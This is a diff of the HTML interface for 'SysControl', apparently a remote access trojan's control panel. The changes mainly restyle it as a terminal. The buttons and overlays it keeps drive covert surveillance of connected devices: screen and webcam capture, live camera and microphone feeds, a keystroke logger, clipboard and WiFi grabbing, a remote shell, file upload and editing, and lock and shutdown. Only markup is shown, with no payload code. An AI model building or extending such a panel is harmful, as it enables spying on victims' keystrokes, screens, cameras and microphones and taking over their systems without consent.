@@ -4,9 +4,12 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>SysControl</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
   <link rel="manifest" href="manifest.json">
-  <meta name="theme-color" content="#0a0e17">
+  <meta name="theme-color" content="#000000">
 </head>
 <body>
 
@@ -15,21 +18,21 @@
     <div class="auth-box">
       <div class="home-header">
         <h1 class="logo">SysControl</h1>
-        <p class="tagline">Remote System Monitor</p>
+        <p class="tagline">> remote system terminal</p>
       </div>
       <div class="auth-form">
         <div class="field">
           <label>Username</label>
-          <input type="text" id="authUser" placeholder="Enter username"
+          <input type="text" id="authUser" placeholder="> enter username"
                  onkeydown="if(event.key==='Enter')document.getElementById('authPass').focus()" autocomplete="username">
         </div>
         <div class="field">
           <label>Password</label>
-          <input type="password" id="authPass" placeholder="Enter password"
+          <input type="password" id="authPass" placeholder="> enter password"
                  onkeydown="if(event.key==='Enter')doAuth()" autocomplete="current-password">
         </div>
         <div id="authError" class="error-text"></div>
-        <button class="btn-pri auth-btn" id="authBtn" onclick="doAuth()">Login</button>
+        <button class="btn-pri auth-btn" id="authBtn" onclick="doAuth()">Authenticate</button>
       </div>
     </div>
   </div>
@@ -39,12 +42,12 @@
     <div class="home-header">
       <div class="home-top-row">
         <h1 class="logo">SysControl</h1>
-        <button class="logout-btn" onclick="doLogout()" title="Logout">Logout</button>
+        <button class="logout-btn" onclick="doLogout()" title="Logout">Exit</button>
       </div>
-      <p class="tagline">Remote System Monitor</p>
+      <p class="tagline">> remote system terminal</p>
     </div>
     <div class="refresh-row">
-      <button class="refresh-btn" id="refreshBtn" onclick="refreshDevices()">Refresh</button>
+      <button class="refresh-btn" id="refreshBtn" onclick="refreshDevices()">Scan</button>
     </div>
     <div class="device-list" id="deviceList">
       <div class="empty-state">Scanning devices...</div>
@@ -61,7 +64,7 @@
       </div>
       <div class="field">
         <label>Password</label>
-        <input type="password" id="loginPassword" placeholder="Enter device password"
+        <input type="password" id="loginPassword" placeholder="> device password"
                onkeydown="if(event.key==='Enter')doLogin()" autocomplete="off">
       </div>
       <div id="loginError" class="error-text"></div>
@@ -75,7 +78,7 @@
   <!-- ===== CONTROL PANEL ===== -->
   <div id="panelScreen" class="screen hidden">
     <div class="panel-header">
-      <button class="back-btn" onclick="disconnect()">&#8592;</button>
+      <button class="back-btn" onclick="disconnect()">&larr;</button>
       <div class="panel-info">
         <h2 id="panelName">Device</h2>
         <span class="status-dot online"></span>
@@ -87,29 +90,24 @@
     <div class="chat-area" id="chatArea"></div>
 
     <div class="cmd-grid" id="cmdGrid">
-      <button class="cmd" onclick="execCmd('/screen')"><span class="ci">&#128248;</span>Screen</button>
-      <button class="cmd" onclick="execCmd('/webcam')"><span class="ci">&#128247;</span>Webcam</button>
-      <button class="cmd" onclick="execCmd('/sys')"><span class="ci">&#128187;</span>System</button>
-      <button class="cmd" onclick="execCmd('/ip')"><span class="ci">&#127760;</span>IP</button>
-      <button class="cmd" onclick="openExplorer()"><span class="ci">&#128194;</span>Files</button>
-      <button class="cmd" onclick="openLiveScreen()"><span class="ci">&#128250;</span>Live</button>
-      <button class="cmd" onclick="openLiveCam()"><span class="ci">&#127909;</span>Cam</button>
-      <button class="cmd" onclick="openLiveMic()"><span class="ci">&#127908;</span>Mic</button>
-      <button class="cmd" onclick="openKeylog()"><span class="ci">&#128273;</span>KeyLog</button>
-      <button class="cmd" onclick="execCmd('/clipboard')"><span class="ci">&#128203;</span>Clipboard</button>
-      <button class="cmd" onclick="execCmd('/wifi')"><span class="ci">&#128246;</span>WiFi</button>
-      <button class="cmd" onclick="execCmd('/lock')"><span class="ci">&#128274;</span>Lock</button>
-      <button class="cmd" onclick="enterShell()"><span class="ci">&#9000;&#65039;</span>Shell</button>
-      <button class="cmd" onclick="promptSpeech()"><span class="ci">&#128266;</span>Speech</button>
-      <button class="cmd" onclick="checkUpdate()"><span class="ci">&#128260;</span>Update</button>
-      <button class="cmd danger" onclick="confirmShutdown()"><span class="ci">&#9211;</span>Shutdown</button>
+      <button class="cmd" onclick="execCmd('/screen')"><span class="ci">/scr</span>Screen</button>
+      <button class="cmd" onclick="openLiveScreen()"><span class="ci">/str</span>Live</button>
+      <button class="cmd" onclick="execCmd('/webcam')"><span class="ci">/cam</span>Webcam</button>
+      <button class="cmd" onclick="openLiveCam()"><span class="ci">/rec</span>Cam</button>
+      <button class="cmd" onclick="promptSpeech()"><span class="ci">/tts</span>Speech</button>
+      <button class="cmd" onclick="openLiveMic()"><span class="ci">/mic</span>Mic</button>
+      <button class="cmd" onclick="openExplorer()"><span class="ci">/dir</span>Files</button>
+      <button class="cmd" onclick="enterShell()"><span class="ci">&gt;_</span>Shell</button>
+      <button class="cmd" onclick="execCmd('/ip')"><span class="ci">/net</span>IP</button>
+      <button class="cmd" onclick="execCmd('/sys')"><span class="ci">/sys</span>System</button>
+      <button class="cmd" onclick="execCmd('/clipboard')"><span class="ci">/clp</span>Clip</button>
+      <button class="cmd" onclick="openKeylog()"><span class="ci">/key</span>KeyLog</button>
+      <button class="cmd" onclick="execCmd('/wifi')"><span class="ci">/wfi</span>WiFi</button>
+      <button class="cmd" onclick="checkUpdate()"><span class="ci">/upd</span>Update</button>
+      <button class="cmd" onclick="execCmd('/lock')"><span class="ci">/lck</span>Lock</button>
+      <button class="cmd danger" onclick="confirmShutdown()"><span class="ci">/pwr</span>Power</button>
     </div>
 
-    <div class="input-bar">
-      <input type="text" id="msgInput" class="msg-input" placeholder="Type a command..."
-             onkeydown="if(event.key==='Enter')sendInput()">
-      <button class="send-btn" onclick="sendInput()">&#10148;</button>
-    </div>
   </div>
 
   <!-- ===== SHELL TERMINAL ===== -->
@@ -120,36 +118,36 @@
         <div class="sh-cwd" id="shCwd">~</div>
       </div>
       <button class="sm-btn" onclick="clearShell()">Clear</button>
-      <button class="close-btn" onclick="closeShell()">&#10005;</button>
+      <button class="close-btn" onclick="closeShell()">x</button>
     </div>
     <div class="shell-output" id="shOutput"></div>
     <div class="shell-bar">
       <span class="sh-ps1" id="shPs1">&gt;</span>
-      <input type="text" class="sh-input" id="shInput" placeholder="Type command..."
+      <input type="text" class="sh-input" id="shInput" placeholder="> command..."
              onkeydown="shellKey(event)">
-      <button class="sh-send" onclick="runShell()">&#9654;</button>
+      <button class="sh-send" onclick="runShell()">&gt;</button>
     </div>
   </div>
 
   <!-- ===== FILE EXPLORER ===== -->
   <div id="explorerOverlay" class="overlay hidden">
     <div class="overlay-header">
-      <button class="back-btn" onclick="explorerBack()">&#8592;</button>
+      <button class="back-btn" onclick="explorerBack()">&larr;</button>
       <div style="flex:1;min-width:0">
         <div class="overlay-title" id="exTitle">Files</div>
         <div class="ex-path" id="exPath">-</div>
       </div>
-      <button class="close-btn" onclick="closeExplorer()">&#10005;</button>
+      <button class="close-btn" onclick="closeExplorer()">x</button>
     </div>
     <div class="drive-bar" id="exDrives"></div>
     <div class="ex-search-row">
-      <input type="text" id="exSearch" class="ex-search" placeholder="Filter..." oninput="filterExplorer()">
+      <input type="text" id="exSearch" class="ex-search" placeholder="> filter..." oninput="filterExplorer()">
     </div>
     <div class="ex-list" id="exList"></div>
     <div class="ex-toolbar">
-      <button class="ex-tb" onclick="uploadToExplorer()">&#128228; Upload</button>
-      <button class="ex-tb" onclick="createFolder()">&#128193; Folder</button>
-      <button class="ex-tb" onclick="createFile()">&#128196; File</button>
+      <button class="ex-tb" onclick="uploadToExplorer()">upload</button>
+      <button class="ex-tb" onclick="createFolder()">mkdir</button>
+      <button class="ex-tb" onclick="createFile()">touch</button>
     </div>
     <input type="file" id="exFileInput" style="display:none" onchange="handleUpload(this)" multiple>
   </div>
@@ -157,14 +155,14 @@
   <!-- ===== FILE EDITOR ===== -->
   <div id="editorOverlay" class="overlay hidden">
     <div class="overlay-header">
-      <button class="back-btn" onclick="closeEditor()">&#8592;</button>
+      <button class="back-btn" onclick="closeEditor()">&larr;</button>
       <div style="flex:1;min-width:0">
         <div class="overlay-title" id="edTitle">Editor</div>
         <div class="ex-path" id="edPath">-</div>
       </div>
-      <span class="dirty-dot hidden" id="edDirty">&#9679;</span>
+      <span class="dirty-dot hidden" id="edDirty">*</span>
       <button class="sm-btn" onclick="saveEditor()" id="edSaveBtn">Save</button>
-      <button class="close-btn" onclick="closeEditor()">&#10005;</button>
+      <button class="close-btn" onclick="closeEditor()">x</button>
     </div>
     <div class="ed-status" id="edStatus"></div>
     <textarea id="edContent" class="ed-textarea" spellcheck="false"
@@ -181,7 +179,7 @@
         <button class="qb active" data-q="med" onclick="setLiveQ('med')">M</button>
         <button class="qb" data-q="high" onclick="setLiveQ('high')">H</button>
       </div>
-      <button class="close-btn" onclick="closeLive()">&#10005;</button>
+      <button class="close-btn" onclick="closeLive()">x</button>
     </div>
     <div class="live-body"><img id="liveImg" class="live-img" alt="Live"></div>
   </div>
@@ -196,7 +194,7 @@
         <button class="qb cam-qb active" data-cq="med" onclick="setCamQ('med')">M</button>
         <button class="qb cam-qb" data-cq="high" onclick="setCamQ('high')">H</button>
       </div>
-      <button class="close-btn" onclick="closeLiveCam()">&#10005;</button>
+      <button class="close-btn" onclick="closeLiveCam()">x</button>
     </div>
     <div class="live-body"><img id="camImg" class="live-img" alt="Camera"></div>
   </div>
@@ -206,10 +204,10 @@
     <div class="overlay-header">
       <div class="overlay-title">Microphone</div>
       <div class="live-meta" id="micMeta">Idle</div>
-      <button class="close-btn" onclick="closeMic()">&#10005;</button>
+      <button class="close-btn" onclick="closeMic()">x</button>
     </div>
     <div class="mic-body">
-      <div class="mic-icon" id="micIcon">&#127908;</div>
+      <div class="mic-icon" id="micIcon">[MIC]</div>
       <p id="micStatus">Press Start to listen.</p>
       <div class="mic-actions">
         <button class="btn-pri" id="micStartBtn" onclick="startMic()">Start</button>
@@ -223,7 +221,7 @@
     <div class="overlay-header">
       <div class="overlay-title">Keystrokes</div>
       <div class="live-meta" id="klMeta">Idle</div>
-      <button class="close-btn" onclick="closeKeylog()">&#10005;</button>
+      <button class="close-btn" onclick="closeKeylog()">x</button>
     </div>
     <div class="kl-actions">
       <button class="sm-btn" id="klStartBtn" onclick="startKeylog()">Start</button>
@@ -239,7 +237,7 @@
     <div class="modal-card" style="max-width:420px">
       <h2>Software Update</h2>
       <div id="updateBody">
-        <p style="color:var(--dim);text-align:center;padding:20px 0">Checking for updates...</p>
+        <p style="color:var(--dim);text-align:center;padding:20px 0">Checking...</p>
       </div>
       <div class="modal-actions" id="updateActions" style="display:none">
         <button class="btn-sec" onclick="closeUpdate()">Close</button>
